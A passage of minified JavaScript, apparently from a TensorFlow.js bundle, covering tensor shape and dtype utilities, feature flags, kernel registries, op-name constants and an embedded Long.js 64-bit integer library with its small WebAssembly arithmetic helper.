!function() {
    "use strict";
    class lf {
        constructor(t, e) {
            this.backend = t,
            this.dataMover = e,
            this.data = new WeakMap,
            this.dataIdsCount = 0
        }
        get(t) {
            return this.data.has(t) || this.dataMover.moveData(this.backend, t),
            this.data.get(t)
        }
        set(t, e) {
            this.dataIdsCount++,
            this.data.set(t, e)
        }
        has(t) {
            return this.data.has(t)
        }
        delete(t) {
            return this.dataIdsCount--,
            this.data.delete(t)
        }
        numDataIds() {
            return this.dataIdsCount
        }
    }
    class Zl {
        refCount(t) {
            return Ze("refCount")
        }
        incRef(t) {
            return Ze("incRef")
        }
        timerAvailable() {
            return !0
        }
        time(t) {
            return Ze("time")
        }
        read(t) {
            return Ze("read")
        }
        readSync(t) {
            return Ze("readSync")
        }
        readToGPU(t, e) {
            return Ze("readToGPU")
        }
        numDataIds() {
            return Ze("numDataIds")
        }
        disposeData(t, e) {
            return Ze("disposeData")
        }
        write(t, e, s) {
            return Ze("write")
        }
        move(t, e, s, o, r) {
            return Ze("move")
        }
        createTensorFromGPUData(t, e, s) {
            return Ze("createTensorFromGPUData")
        }
        memory() {
            return Ze("memory")
        }
        floatPrecision() {
            return Ze("floatPrecision")
        }
        epsilon() {
            return 32 === this.floatPrecision() ? 1e-7 : 1e-4
        }
        dispose() {
            return Ze("dispose")
        }
    }
    function Ze(n) {
        throw new Error(`'${n}' not yet implemented or not found in the registry. This kernel may not be supported by the tfjs backend you have chosen`)
    }
    function jI(n) {
        let t = n.length
          , e = 0;
        for (; t > 0; )
            e = Math.random() * t | 0,
            t--,
            Eo(n, t, e)
    }
    function Ks(n, t, e) {
        return Math.max(n, Math.min(t, e))
    }
    function Bl(n) {
        return n % 2 == 0 ? n : n + 1
    }
    function Eo(n, t, e) {
        const s = n[t];
        n[t] = n[e],
        n[e] = s
    }
    function v(n, t) {
        if (!n)
            throw new Error("string" == typeof t ? t : t())
    }
    function Hl(n, t, e="") {
        v(Rt(n, t), (()=>e + ` Shapes ${n} and ${t} must match`))
    }
    function _l(n) {
        v(null != n, (()=>"The input to the tensor constructor must be a non-null value."))
    }
    function Z(n) {
        if (0 === n.length)
            return 1;
        let t = n[0];
        for (let e = 1; e < n.length; e++)
            t *= n[e];
        return t
    }
    function Rt(n, t) {
        if (n === t)
            return !0;
        if (null == n || null == t || n.length !== t.length)
            return !1;
        for (let e = 0; e < n.length; e++)
            if (n[e] !== t[e])
                return !1;
        return !0
    }
    function Do(n) {
        return n % 1 == 0
    }
    function Ul(n) {
        const t = Math.ceil(Math.sqrt(n));
        return [t, Math.ceil(n / t)]
    }
    function Wo(n, t) {
        return t <= n.length ? n : n + " ".repeat(t - n.length)
    }
    function uf(n, t=(o=>0), e, s) {
        return new Promise(((o,r)=>{
            let i = 0;
            const a = ()=>{
                if (n())
                    return void o();
                i++;
                const c = t(i);
                null != e && i >= e ? r() : null != s ? s(a, c) : setTimeout(a, c)
            }
            ;
            a()
        }
        ))
    }
    function df(n, t) {
        let e = 1
          , s = -1;
        for (let r = 0; r < n.length; ++r)
            if (n[r] >= 0)
                e *= n[r];
            else if (-1 === n[r]) {
                if (-1 !== s)
                    throw Error(`Shapes can only have 1 implicit size. Found -1 at dim ${s} and dim ${r}`);
                s = r
            } else if (n[r] < 0)
                throw Error(`Shapes can not be < 0. Found ${n[r]} at dim ${r}`);
        if (-1 === s) {
            if (t > 0 && t !== e)
                throw Error(`Size(${t}) must match the product of shape ${n}`);
            return n
        }
        if (0 === e)
            throw Error(`Cannot infer the missing size in [${n}] when there are 0 elements`);
        if (t % e != 0)
            throw Error(`The implicit shape can't be a fractional number. Got ${t} / ${e}`);
        const o = n.slice();
        return o[s] = t / e,
        o
    }
    function It(n, t) {
        const e = t.length;
        return v((n = null == n ? t.map(((s,o)=>o)) : [].concat(n)).every((s=>s >= -e && s < e)), (()=>`All values in axis param must be in range [-${e}, ${e}) but got axis ${n}`)),
        v(n.every((s=>Do(s))), (()=>`All values in axis param must be integers but got axis ${n}`)),
        n.map((s=>s < 0 ? e + s : s))
    }
    function fs(n, t) {
        const e = []
          , s = []
          , o = null != t && Array.isArray(t) && 0 === t.length
          , r = null == t || o ? null : It(t, n).sort();
        let i = 0;
        for (let a = 0; a < n.length; ++a) {
            if (null != r) {
                if (r[i] === a && 1 !== n[a])
                    throw new Error(`Can't squeeze axis ${a} since its dim '${n[a]}' is not 1`);
                (null == r[i] || r[i] > a) && 1 === n[a] && (e.push(n[a]),
                s.push(a)),
                r[i] <= a && i++
            }
            1 !== n[a] && (e.push(n[a]),
            s.push(a))
        }
        return {
            newShape: e,
            keptDims: s
        }
    }
    function Se(n, t) {
        return qt(n, t)
    }
    function qt(n, t) {
        let e = null;
        if (null == n || "float32" === n)
            e = new Float32Array(t);
        else if ("int32" === n)
            e = new Int32Array(t);
        else if ("bool" === n)
            e = new Uint8Array(t);
        else {
            if ("string" !== n)
                throw new Error(`Unknown data type ${n}`);
            e = new Array(t)
        }
        return e
    }
    function hf(n, t) {
        return !("complex64" === t || "float32" === t && "complex64" !== n || "int32" === t && "float32" !== n && "complex64" !== n || "bool" === t && "bool" === n)
    }
    function xa(n) {
        if ("float32" === n || "int32" === n)
            return 4;
        if ("complex64" === n)
            return 8;
        if ("bool" === n)
            return 1;
        throw new Error(`Unknown dtype ${n}`)
    }
    function Cr(n) {
        return "string" == typeof n || n instanceof String
    }
    function Yl(n) {
        return "number" == typeof n
    }
    function Mo(n) {
        return Array.isArray(n) ? Mo(n[0]) : n instanceof Float32Array ? "float32" : n instanceof Int32Array || n instanceof Uint8Array || n instanceof Uint8ClampedArray ? "int32" : Yl(n) ? "float32" : Cr(n) ? "string" : function sw(n) {
            return "boolean" == typeof n
        }(n) ? "bool" : "float32"
    }
    function Ql(n) {
        return !!(n && n.constructor && n.call && n.apply)
    }
    function Jl(n, t) {
        for (let e = t; e < n; ++e)
            if (n % e == 0)
                return e;
        return n
    }
    function ct(n) {
        const t = n.length;
        if (t < 2)
            return [];
        const e = new Array(t - 1);
        e[t - 2] = n[t - 1];
        for (let s = t - 3; s >= 0; --s)
            e[s] = e[s + 1] * n[s + 1];
        return e
    }
    function pf(n, t, e, s=!1) {
        const o = new Array;
        if (1 === t.length) {
            const r = t[0] * (s ? 2 : 1);
            for (let i = 0; i < r; i++)
                o[i] = e[n + i]
        } else {
            const r = t[0]
              , i = t.slice(1)
              , a = i.reduce(((c,l)=>c * l)) * (s ? 2 : 1);
            for (let c = 0; c < r; c++)
                o[c] = pf(n + c * a, i, e, s)
        }
        return o
    }
    function vn(n, t, e=!1) {
        if (0 === n.length)
            return t[0];
        const s = n.reduce(((o,r)=>o * r)) * (e ? 2 : 1);
        if (0 === s)
            return [];
        if (s !== t.length)
            throw new Error(`[${n}] does not match the input size ${t.length}${e ? " for a complex tensor" : ""}.`);
        return pf(0, n, t, e)
    }
    function jl(n, t) {
        const e = ke(n, t);
        for (let s = 0; s < e.length; s++)
            e[s] = 1;
        return e
    }
    function ke(n, t) {
        if (null == t || "float32" === t || "complex64" === t)
            return new Float32Array(n);
        if ("int32" === t)
            return new Int32Array(n);
        if ("bool" === t)
            return new Uint8Array(n);
        throw new Error(`Unknown data type ${t}`)
    }
    function ff(n, t) {
        const e = n.reduce(((s,o)=>s * o), 1);
        if (null == t || "float32" === t)
            return vn(n, new Float32Array(e));
        if ("int32" === t)
            return vn(n, new Int32Array(e));
        if ("bool" === t)
            return vn(n, new Uint8Array(e));
        throw new Error(`Unknown data type ${t}`)
    }
    function es(n) {
        n.forEach((t=>{
            v(Number.isInteger(t) && t >= 0, (()=>`Tensor must have a shape comprised of positive integers but got shape [${n}].`))
        }
        ))
    }
    function Fn(n, t, e) {
        if (0 === t)
            return 0;
        if (1 === t)
            return n[0];
        let s = n[n.length - 1];
        for (let o = 0; o < n.length - 1; ++o)
            s += e[o] * n[o];
        return s
    }
    function Vo(n, t, e) {
        if (0 === t)
            return [];
        if (1 === t)
            return [n];
        const s = new Array(t);
        for (let o = 0; o < s.length - 1; ++o)
            s[o] = Math.floor(n / e[o]),
            n -= s[o] * e[o];
        return s[s.length - 1] = n,
        s
    }
    function ql(n) {
        return n && n.then && "function" == typeof n.then
    }
    const mf = "tfjsflags";
    class rw {
        constructor(t) {
            this.global = t,
            this.flags = {},
            this.flagRegistry = {},
            this.urlFlags = {},
            this.getQueryParams = iw,
            this.populateURLFlags()
        }
        setPlatform(t, e) {
            null != this.platform && (z().getBool("IS_TEST") || z().getBool("PROD") || console.warn(`Platform ${this.platformName} has already been set. Overwriting the platform with ${t}.`)),
            this.platformName = t,
            this.platform = e
        }
        registerFlag(t, e, s) {
            if (this.flagRegistry[t] = {
                evaluationFn: e,
                setHook: s
            },
            null != this.urlFlags[t]) {
                const o = this.urlFlags[t];
                z().getBool("IS_TEST") || z().getBool("PROD") || console.warn(`Setting feature override from URL ${t}: ${o}.`),
                this.set(t, o)
            }
        }
        async getAsync(t) {
            return t in this.flags || (this.flags[t] = await this.evaluateFlag(t)),
            this.flags[t]
        }
        get(t) {
            if (t in this.flags)
                return this.flags[t];
            const e = this.evaluateFlag(t);
            if (ql(e))
                throw new Error(`Flag ${t} cannot be synchronously evaluated. Please use getAsync() instead.`);
            return this.flags[t] = e,
            this.flags[t]
        }
        getNumber(t) {
            return this.get(t)
        }
        getBool(t) {
            return this.get(t)
        }
        getString(t) {
            return this.get(t)
        }
        getFlags() {
            return this.flags
        }
        get features() {
            return this.flags
        }
        set(t, e) {
            if (null == this.flagRegistry[t])
                throw new Error(`Cannot set flag ${t} as it has not been registered.`);
            this.flags[t] = e,
            null != this.flagRegistry[t].setHook && this.flagRegistry[t].setHook(e)
        }
        evaluateFlag(t) {
            if (null == this.flagRegistry[t])
                throw new Error(`Cannot evaluate flag '${t}': no evaluation function found.`);
            return this.flagRegistry[t].evaluationFn()
        }
        setFlags(t) {
            this.flags = Object.assign({}, t)
        }
        reset() {
            this.flags = {},
            this.urlFlags = {},
            this.populateURLFlags()
        }
        populateURLFlags() {
            if (typeof this.global > "u" || typeof this.global.location > "u" || typeof this.global.location.search > "u")
                return;
            const t = this.getQueryParams(this.global.location.search);
            mf in t && t[mf].split(",").forEach((s=>{
                const [o,r] = s.split(":");
                this.urlFlags[o] = function cw(n, t) {
                    const e = t.toLowerCase();
                    return "true" === e || "false" === e ? "true" === e : "" + +e === e ? +e : t
                }(0, r)
            }
            ))
        }
    }
    function iw(n) {
        const t = {};
        return n.replace(/[?&]([^=?&]+)(?:=([^&]*))?/g, ((e,...s)=>(function aw(n, t, e) {
            n[decodeURIComponent(t)] = decodeURIComponent(e || "")
        }(t, s[0], s[1]),
        s.join("=")))),
        t
    }
    function z() {
        return gf
    }
    let tu, gf = null;
    function bf() {
        if (null == tu) {
            let n;
            if (typeof window < "u")
                n = window;
            else if (typeof global < "u")
                n = global;
            else if (typeof process < "u")
                n = process;
            else {
                if (!(typeof self < "u"))
                    throw new Error("Could not find a global object");
                n = self
            }
            tu = n
        }
        return tu
    }
    function eu(n, t) {
        const e = function uw() {
            const n = bf();
            return null == n._tfGlobals && (n._tfGlobals = new Map),
            n._tfGlobals
        }();
        if (e.has(n))
            return e.get(n);
        {
            const s = t();
            return e.set(n, s),
            e.get(n)
        }
    }
    const ya = "Abs"
      , vr = "Acos"
      , Sr = "Acosh"
      , Fo = "Add"
      , nu = "AddN"
      , Ia = "ArgMax"
      , wa = "ArgMin"
      , kr = "Asin"
      , Tr = "Asinh"
      , Nr = "Atan"
      , Rr = "Atanh"
      , $r = "Atan2"
      , Ca = "AvgPool"
      , ru = "AvgPoolGrad"
      , va = "AvgPool3D"
      , iu = "AvgPool3DGrad"
      , Sa = "BatchMatMul"
      , ka = "BatchToSpaceND"
      , au = "Bincount"
      , cu = "BitwiseAnd"
      , xf = "BroadcastArgs"
      , Gr = "Cast"
      , Lr = "Ceil"
      , Er = "ClipByValue"
      , lu = "Complex"
      , Ta = "ComplexAbs"
      , Na = "Concat"
      , Ra = "Conv2D"
      , uu = "Conv2DBackpropFilter"
      , $a = "Conv2DBackpropInput"
      , Ga = "Conv3D"
      , du = "Conv3DBackpropFilterV2"
      , hu = "Conv3DBackpropInputV2"
      , Dr = "Cos"
      , Wr = "Cosh"
      , pu = "Cumprod"
      , La = "Cumsum"
      , fu = "CropAndResize"
      , mu = "DenseBincount"
      , gu = "DepthToSpace"
      , Ea = "DepthwiseConv2dNative"
      , bu = "DepthwiseConv2dNativeBackpropFilter"
      , xu = "DepthwiseConv2dNativeBackpropInput"
      , Da = "Dilation2D"
      , yu = "Dilation2DBackpropInput"
      , Iu = "Dilation2DBackpropFilter"
      , Mr = "RealDiv"
      , wu = "Einsum"
      , Vr = "Elu"
      , Cu = "EluGrad"
      , Fr = "Erf"
      , Wa = "Equal"
      , zr = "Exp"
      , Ma = "ExpandDims"
      , Xr = "Expm1"
      , Su = "Fill"
      , ku = "FlipLeftRight"
      , Ar = "Floor"
      , Pr = "FloorDiv"
      , Va = "FusedBatchNorm"
      , Fa = "GatherV2"
      , If = "GatherNd"
      , za = "Greater"
      , Or = "GreaterEqual"
      , Kr = "Identity"
      , Tu = "IFFT"
      , Nu = "Imag"
      , Zr = "IsFinite"
      , Br = "IsInf"
      , Hr = "IsNan"
      , Xa = "LeakyRelu"
      , Aa = "Less"
      , Pa = "LessEqual"
      , wf = "LinSpace"
      , _r = "Log"
      , Ur = "Log1p"
      , Oa = "LogicalAnd"
      , Ka = "LogicalNot"
      , Za = "LogicalOr"
      , Ba = "LRN"
      , Ru = "LRNGrad"
      , Ha = "Max"
      , Yr = "Maximum"
      , _a = "MaxPool"
      , $u = "MaxPoolGrad"
      , Ua = "MaxPool3D"
      , Gu = "MaxPool3DGrad"
      , Cf = "MaxPoolWithArgmax"
      , Ya = "Mean"
      , Qa = "Min"
      , Qr = "Minimum"
      , Ja = "MirrorPad"
      , Jr = "Mod"
      , vf = "Multinomial"
      , jr = "Multiply"
      , ja = "Neg"
      , qa = "NotEqual"
      , Lu = "NonMaxSuppressionV3"
      , Eu = "NonMaxSuppressionV4"
      , Du = "NonMaxSuppressionV5"
      , tc = "OnesLike"
      , ec = "OneHot"
      , nc = "Pack"
      , sc = "PadV2"
      , qr = "Pow"
      , oc = "Prelu"
      , rc = "Prod"
      , Sf = "RaggedGather"
      , kf = "RaggedRange"
      , Tf = "RaggedTensorToTensor"
      , Wu = "Range"
      , Mu = "Real"
      , ti = "Reciprocal"
      , ei = "Relu"
      , ic = "Reshape"
      , ac = "ResizeNearestNeighbor"
      , Vu = "ResizeNearestNeighborGrad"
      , cc = "ResizeBilinear"
      , Fu = "ResizeBilinearGrad"
      , ni = "Relu6"
      , lc = "Reverse"
      , si = "Round"
      , oi = "Rsqrt"
      , Nf = "ScatterNd"
      , Rf = "TensorScatterUpdate"
      , $f = "SearchSorted"
      , uc = "Select"
      , ri = "Selu"
      , dc = "Slice"
      , ii = "Sin"
      , ai = "Sinh"
      , ci = "Sign"
      , li = "Sigmoid"
      , ui = "Softplus"
      , di = "Sqrt"
      , hc = "Sum"
      , pc = "SpaceToBatchND"
      , fc = "SplitV"
      , mc = "Softmax"
      , Gf = "SparseFillEmptyRows"
      , Lf = "SparseReshape"
      , Ef = "SparseSegmentMean"
      , Df = "SparseSegmentSum"
      , Wf = "SparseToDense"
      , hi = "SquaredDifference"
      , zu = "Square"
      , Xu = "StaticRegexReplace"
      , Au = "StridedSlice"
      , Mf = "StringNGrams"
      , Vf = "StringSplit"
      , Ff = "StringToHashBucketFast"
      , pi = "Sub"
      , fi = "Tan"
      , mi = "Tanh"
      , gi = "Tile"
      , Pu = "TopK"
      , Ou = "Transform"
      , zo = "Transpose"
      , Ku = "Unique"
      , gc = "Unpack"
      , bc = "UnsortedSegmentSum"
      , xc = "ZerosLike"
      , bi = "Step"
      , Zu = "FromPixels"
      , Bu = "RotateWithOffset"
      , yc = "_FusedMatMul"
      , Ic = "FusedConv2D"
      , zf = "FusedDepthwiseConv2D";
    function je(...n) {
        z().getBool("IS_TEST") || z().getBool("PROD") || console.warn(...n)
    }
    const wc = eu("kernelRegistry", (()=>new Map))
      , Hu = eu("gradRegistry", (()=>new Map));
    function _u(n, t) {
        const e = Pf(n, t);
        return wc.get(e)
    }
    function Xf(n) {
        return Hu.get(n)
    }
    function Af(n) {
        const t = wc.entries()
          , e = [];
        for (; ; ) {
            const {done: s, value: o} = t.next();
            if (s)
                break;
            const [r,i] = o
              , [a] = r.split("_");
            a === n && e.push(i)
        }
        return e
    }
    function qe(n) {
        const {kernelName: t, backendName: e} = n
          , s = Pf(t, e);
        wc.has(s) && je(`The kernel '${t}' for backend '${e}' is already registered`),
        wc.set(s, n)
    }
    function mw(n) {
        const {kernelName: t} = n;
        Hu.has(t) && z().getBool("DEBUG") && je(`Overriding the gradient for '${t}'`),
        Hu.set(t, n)
    }
    function Pf(n, t) {
        return `${t}_${n}`
    }
    function Of(n) {
        return n instanceof Float32Array || n instanceof Int32Array || n instanceof Uint8Array || n instanceof Uint8ClampedArray
    }
    var Zs = typeof globalThis < "u" ? globalThis : typeof window < "u" ? window : typeof global < "u" ? global : typeof self < "u" ? self : {};
    var Kf = Kt
      , ln = null;
    try {
        ln = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 13, 2, 96, 0, 1, 127, 96, 4, 127, 127, 127, 127, 1, 127, 3, 7, 6, 0, 1, 1, 1, 1, 1, 6, 6, 1, 127, 1, 65, 0, 11, 7, 50, 6, 3, 109, 117, 108, 0, 1, 5, 100, 105, 118, 95, 115, 0, 2, 5, 100, 105, 118, 95, 117, 0, 3, 5, 114, 101, 109, 95, 115, 0, 4, 5, 114, 101, 109, 95, 117, 0, 5, 8, 103, 101, 116, 95, 104, 105, 103, 104, 0, 0, 10, 191, 1, 6, 4, 0, 35, 0, 11, 36, 1, 1, 126, 32, 0, 173, 32, 1, 173, 66, 32, 134, 132, 32, 2, 173, 32, 3, 173, 66, 32, 134, 132, 126, 34, 4, 66, 32, 135, 167, 36, 0, 32, 4, 167, 11, 36, 1, 1, 126, 32, 0, 173, 32, 1, 173, 66, 32, 134, 132, 32, 2, 173, 32, 3, 173, 66, 32, 134, 132, 127, 34, 4, 66, 32, 135, 167, 36, 0, 32, 4, 167, 11, 36, 1, 1, 126, 32, 0, 173, 32, 1, 173, 66, 32, 134, 132, 32, 2, 173, 32, 3, 173, 66, 32, 134, 132, 128, 34, 4, 66, 32, 135, 167, 36, 0, 32, 4, 167, 11, 36, 1, 1, 126, 32, 0, 173, 32, 1, 173, 66, 32, 134, 132, 32, 2, 173, 32, 3, 173, 66, 32, 134, 132, 129, 34, 4, 66, 32, 135, 167, 36, 0, 32, 4, 167, 11, 36, 1, 1, 126, 32, 0, 173, 32, 1, 173, 66, 32, 134, 132, 32, 2, 173, 32, 3, 173, 66, 32, 134, 132, 130, 34, 4, 66, 32, 135, 167, 36, 0, 32, 4, 167, 11])),{}).exports
    } catch {}
    function Kt(n, t, e) {
        this.low = 0 | n,
        this.high = 0 | t,
        this.unsigned = !!e
    }
    function Be(n) {
        return !0 === (n && n.__isLong__)
    }
    Kt.prototype.__isLong__,
    Object.defineProperty(Kt.prototype, "__isLong__", {
        value: !0
    }),
    Kt.isLong = Be;
    var Zf = {}
      , Bf = {};
    function Bs(n, t) {
        var e, s, o;
        return t ? (o = 0 <= (n >>>= 0) && n < 256) && (s = Bf[n]) ? s : (e = Zt(n, (0 | n) < 0 ? -1 : 0, !0),
        o && (Bf[n] = e),
        e) : (o = -128 <= (n |= 0) && n < 128) && (s = Zf[n]) ? s : (e = Zt(n, n < 0 ? -1 : 0, !1),
        o && (Zf[n] = e),
        e)
    }
    function un(n, t) {
        if (isNaN(n))
            return t ? Hs : dn;
        if (t) {
            if (n < 0)
                return Hs;
            if (n >= _f)
                return jf
        } else {
            if (n <= -Uf)
                return He;
            if (n + 1 >= Uf)
                return Jf
        }
        return n < 0 ? un(-n, t).neg() : Zt(n % Xo | 0, n / Xo | 0, t)
    }
    function Zt(n, t, e) {
        return new Kt(n,t,e)
    }
    Kt.fromInt = Bs,
    Kt.fromNumber = un,
    Kt.fromBits = Zt;
    var Cc = Math.pow;
    function Uu(n, t, e) {
        if (0 === n.length)
            throw Error("empty string");
        if ("NaN" === n || "Infinity" === n || "+Infinity" === n || "-Infinity" === n)
            return dn;
        if ("number" == typeof t ? (e = t,
        t = !1) : t = !!t,
        (e = e || 10) < 2 || 36 < e)
            throw RangeError("radix");
        var s;
        if ((s = n.indexOf("-")) > 0)
            throw Error("interior hyphen");
        if (0 === s)
            return Uu(n.substring(1), t, e).neg();
        for (var o = un(Cc(e, 8)), r = dn, i = 0; i < n.length; i += 8) {
            var a = Math.min(8, n.length - i)
              , c = parseInt(n.substring(i, i + a), e);
            if (a < 8) {
                var l = un(Cc(e, a));
                r = r.mul(l).add(un(c))
            } else
                r = (r = r.mul(o)).add(un(c))
        }
        return r.unsigned = t,
        r
    }
    function Sn(n, t) {
        return "number" == typeof n ? un(n, t) : "string" == typeof n ? Uu(n, t) : Zt(n.low, n.high, "boolean" == typeof t ? t : n.unsigned)
    }
    Kt.fromString = Uu,
    Kt.fromValue = Sn;
    var Xo = 4294967296
      , _f = Xo * Xo
      , Uf = _f / 2
      , Yf = Bs(1 << 24)
      , dn = Bs(0);
    Kt.ZERO = dn;
    var Hs = Bs(0, !0);
    Kt.UZERO = Hs;
    var Ao = Bs(1);
    Kt.ONE = Ao;
    var Qf = Bs(1, !0);
    Kt.UONE = Qf;
    var Yu = Bs(-1);
    Kt.NEG_ONE = Yu;
    var Jf = Zt(-1, 2147483647, !1);
    Kt.MAX_VALUE = Jf;
    var jf = Zt(-1, -1, !0);
    Kt.MAX_UNSIGNED_VALUE = jf;
    var He = Zt(0, -2147483648, !1);
    Kt.MIN_VALUE = He;
    var et = Kt.prototype;
    et.toInt = function() {
        return this.unsigned ? this.low >>> 0 : this.low
    }
    ,
    et.toNumber = function() {
        return this.unsigned ? (this.high >>> 0) * Xo + (this.low >>> 0) : this.high * Xo + (this.low >>> 0)
    }
    ,
    et.toString = function(t) {
        if ((t = t || 10) < 2 || 36 < t)
            throw RangeError("radix");
        if (this.isZero())
            return "0";
        if (this.isNegative()) {
            if (this.eq(He)) {
                var e = un(t)
                  , s = this.div(e)
                  , o = s.mul(e).sub(this);
                return s.toString(t) + o.toInt().toString(t)
            }
            return "-" + this.neg().toString(t)
        }
        for (var r = un(Cc(t, 6), this.unsigned), i = this, a = ""; ; ) {
            var c = i.div(r)
              , u = (i.sub(c.mul(r)).toInt() >>> 0).toString(t);
            if ((i = c).isZero())
                return u + a;
            for (; u.length < 6; )
                u = "0" + u;
            a = "" + u + a
        }
    }
    ,
    et.getHighBits = function() {
        return this.high
    }
    ,
    et.getHighBitsUnsigned = function() {
        return this.high >>> 0
    }
    ,
    et.getLowBits = function() {
        return this.low
    }
    ,
    et.getLowBitsUnsigned = function() {
        return this.low >>> 0
    }
    ,
    et.getNumBitsAbs = function() {
        if (this.isNegative())
            return this.eq(He) ? 64 : this.neg().getNumBitsAbs();
        for (var t = 0 != this.high ? this.high : this.low, e = 31; e > 0 && !(t & 1 << e); e--)
            ;
        return 0 != this.high ? e + 33 : e + 1
    }
    ,
    et.isZero = function() {
        return 0 === this.high && 0 === this.low
    }
    ,
    et.eqz = et.isZero,
    et.isNegative = function() {
        return !this.unsigned && this.high < 0
    }
    ,
    et.isPositive = function() {
        return this.unsigned || this.high >= 0
    }
    ,
    et.isOdd = function() {
        return !(1 & ~this.low)
    }
    ,
    et.isEven = function() {
        return !(1 & this.low)
    }
    ,
    et.equals = function(t) {
        return Be(t) || (t = Sn(t)),
        (this.unsigned === t.unsigned || this.high >>> 31 != 1 || t.high >>> 31 != 1) && (this.high === t.high && this.low === t.low)
    }
    ,
    et.eq = et.equals,
    et.notEquals = function(t) {
        return !this.eq(t)
    }
    ,
    et.neq = et.notEquals,
    et.ne = et.notEquals,
    et.lessThan = function(t) {
        return this.comp(t) < 0
    }
    ,
    et.lt = et.lessThan,
    et.lessThanOrEqual = function(t) {
        return this.comp(t) <= 0
    }
    ,
    et.lte = et.lessThanOrEqual,
    et.le = et.lessThanOrEqual,
    et.greaterThan = function(t) {
        return this.comp(t) > 0
    }
    ,
    et.gt = et.greaterThan,
    et.greaterThanOrEqual = function(t) {
        return this.comp(t) >= 0
    }
    ,
    et.gte = et.greaterThanOrEqual,
    et.ge = et.greaterThanOrEqual,
    et.compare = function(t) {
        if (Be(t) || (t = Sn(t)),
        this.eq(t))
            return 0;
        var e = this.isNegative()
          , s = t.isNegative();
        return e && !s ? -1 : !e && s ? 1 : this.unsigned ? t.high >>> 0 > this.high >>> 0 || t.high === this.high && t.low >>> 0 > this.low >>> 0 ? -1 : 1 : this.sub(t).isNegative() ? -1 : 1
    }
    ,
    et.comp = et.compare,
    et.negate = function() {
        return !this.unsigned && this.eq(He) ? He : this.not().add(Ao)
    }
    ,
    et.neg = et.negate,
    et.add = function(t) {
        Be(t) || (t = Sn(t));
        var e = this.high >>> 16
          , s = 65535 & this.high
          , o = this.low >>> 16
          , r = 65535 & this.low
          , i = t.high >>> 16
          , a = 65535 & t.high
          , c = t.low >>> 16
          , u = 0
          , d = 0
          , h = 0
          , p = 0;
        return h += (p += r + (65535 & t.low)) >>> 16,
        d += (h += o + c) >>> 16,
        u += (d += s + a) >>> 16,
        u += e + i,
        Zt((h &= 65535) << 16 | (p &= 65535), (u &= 65535) << 16 | (d &= 65535), this.unsigned)
    }
    ,
    et.subtract = function(t) {
        return Be(t) || (t = Sn(t)),
        this.add(t.neg())
    }
    ,
    et.sub = et.subtract,
    et.multiply = function(t) {
        if (this.isZero())
            return dn;
        if (Be(t) || (t = Sn(t)),
        ln)
            return Zt(ln.mul(this.low, this.high, t.low, t.high), ln.get_high(), this.unsigned);
        if (t.isZero())
            return dn;
        if (this.eq(He))
            return t.isOdd() ? He : dn;
        if (t.eq(He))
            return this.isOdd() ? He : dn;
        if (this.isNegative())
            return t.isNegative() ? this.neg().mul(t.neg()) : this.neg().mul(t).neg();
        if (t.isNegative())
            return this.mul(t.neg()).neg();
        if (this.lt(Yf) && t.lt(Yf))
            return un(this.toNumber() * t.toNumber(), this.unsigned);
        var s = this.high >>> 16
          , o = 65535 & this.high
          , r = this.low >>> 16
          , i = 65535 & this.low
          , a = t.high >>> 16
          , c = 65535 & t.high
          , l = t.low >>> 16
          , u = 65535 & t.low
          , d = 0
          , h = 0
          , p = 0
          , f = 0;
        return p += (f += i * u) >>> 16,
        h += (p += r * u) >>> 16,
        p &= 65535,
        h += (p += i * l) >>> 16,
        d += (h += o * u) >>> 16,
        h &= 65535,
        d += (h += r * l) >>> 16,
        h &= 65535,
        d += (h += i * c) >>> 16,
        d += s * u + o * l + r * c + i * a,
        Zt((p &= 65535) << 16 | (f &= 65535), (d &= 65535) << 16 | (h &= 65535), this.unsigned)
    }
    ,
    et.mul = et.multiply,
    et.divide = function(t) {
        if (Be(t) || (t = Sn(t)),
        t.isZero())
            throw Error("division by zero");
        var s, o, r;
        if (ln)
            return this.unsigned || -2147483648 !== this.high || -1 !== t.low || -1 !== t.high ? Zt((this.unsigned ? ln.div_u : ln.div_s)(this.low, this.high, t.low, t.high), ln.get_high(), this.unsigned) : this;
        if (this.isZero())
            return this.unsigned ? Hs : dn;
        if (this.unsigned) {
            if (t.unsigned || (t = t.toUnsigned()),
            t.gt(this))
                return Hs;
            if (t.gt(this.shru(1)))
                return Qf;
            r = Hs
        } else {
            if (this.eq(He))
                return t.eq(Ao) || t.eq(Yu) ? He : t.eq(He) ? Ao : (s = this.shr(1).div(t).shl(1)).eq(dn) ? t.isNegative() ? Ao : Yu : (o = this.sub(t.mul(s)),
                r = s.add(o.div(t)));
            if (t.eq(He))
                return this.unsigned ? Hs : dn;
            if (this.isNegative())
                return t.isNegative() ? this.neg().div(t.neg()) : this.neg().div(t).neg();
            if (t.isNegative())
                return this.div(t.neg()).neg();
            r = dn
        }
        for (o = this; o.gte(t); ) {
            s = Math.max(1, Math.floor(o.toNumber() / t.toNumber()));
            for (var a = Math.ceil(Math.log(s) / Math.LN2), c = a <= 48 ? 1 : Cc(2, a - 48), l = un(s), u = l.mul(t); u.isNegative() || u.gt(o); )
                u = (l = un(s -= c, this.unsigned)).mul(t);
            l.isZero() && (l = Ao),
            r = r.add(l),
            o = o.sub(u)
        }
        return r
    }
    ,
    et.div = et.divide,
    et.modulo = function(t) {
        return Be(t) || (t = Sn(t)),
        ln ? Zt((this.unsigned ? ln.rem_u : ln.rem_s)(this.low, this.high, t.low, t.high), ln.get_high(), this.unsigned) : this.sub(this.div(t).mul(t))
    }
    ,
    et.mod = et.modulo,
    et.rem = et.modulo,
    et.not = function() {
        return Zt(~this.low, ~this.high, this.unsigned)
    }
    ,
    et.and = function(t) {
        return Be(t) || (t = Sn(t)),
        Zt(this.low & t.low, this.high & t.high, this.unsigned)
    }
    ,
    et.or = function(t) {
        return Be(t) || (t = Sn(t)),
        Zt(this.low | t.low, this.high | t.high, this.unsigned)
    }
    ,
    et.xor = function(t) {
        return Be(t) || (t = Sn(t)),
        Zt(this.low ^ t.low, this.high ^ t.high, this.unsigned)
    }
    ,
    et.shiftLeft = function(t) {
        return Be(t) && (t = t.toInt()),
        0 == (t &= 63) ? this : t < 32 ? Zt(this.low << t, this.high << t | this.low >>> 32 - t, this.unsigned) : Zt(0, this.low << t - 32, this.unsigned)
    }
    ,
    et.shl = et.shiftLeft,
    et.shiftRight = function(t) {
        return Be(t) && (t = t.toInt()),
